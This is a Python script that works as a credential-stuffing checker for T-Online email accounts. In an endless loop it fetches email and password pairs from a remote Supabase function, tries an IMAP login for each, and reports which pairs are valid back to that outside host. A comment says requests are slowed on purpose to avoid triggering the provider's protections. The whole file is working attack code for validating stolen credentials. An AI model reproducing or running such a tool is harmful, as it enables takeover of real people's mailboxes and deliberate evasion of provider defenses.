import imaplib
import time
import requests

SUPABASE_URL = "https://uryfrvpoyhrzfgctupqk.supabase.co"

IMAP_SERVER = "secureimap.t-online.de"
IMAP_PORT = 993

def test_account(email, password):
    try:
        mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT, timeout=15)
        mail.login(email, password)
        mail.logout()
        return True, "LOGIN OK"

    except imaplib.IMAP4.error as e:
        return False, f"LOGIN FAILED: {e}"

    except Exception as e:
        return False, f"ERROR: {e}"

"""
with open("accounts.txt", "r", encoding="utf-8") as f:
    accounts = [line.strip() for line in f if line.strip()]
"""

#for account in accounts:
while True:
    headers = {
    }
    account_id = None
    try:
        # 1. Get pending account
        response = requests.get(
            f"{SUPABASE_URL}/functions/v1/get-t-online",
            headers=headers,
            timeout=30
        )
        
        if response.status_code != 200:
            print("Get account error:", response.text)
            exit()
        
        data = response.json()
        
        if not data.get("success"):
            print("No account:", data)
            exit()
        
        account_id = data["id"]
        email = data["email"]
        password = data["password"]
        
        print("ID:", account_id)
        print("Email:", email)
        print("Password:", password)
        #email, password = account.split(":", 1)
    except ValueError:
        print(f"[INVALID FORMAT] {account}")
        continue

    ok, message = test_account(email, password)

    if ok:
        print(f"[+] {email} -> {message}")
        valid = "yes"
        # 3. Update account
        response = requests.get(
            f"{SUPABASE_URL}/functions/v1/update-t-online",
            params={
                "id": account_id,
                "valid": valid
            },
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            print("Updated:", response.json())
        else:
            print("Update error:", response.text)
    else:
        print(f"[-] {email} -> {message}")
        valid = "no"
        # 3. Update account
        response = requests.get(
            f"{SUPABASE_URL}/functions/v1/update-t-online",
            params={
                "id": account_id,
                "valid": valid
            },
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            print("Updated:", response.json())
        else:
            print("Update error:", response.text)

    # Keep requests slow to avoid triggering provider protections
    time.sleep(3)
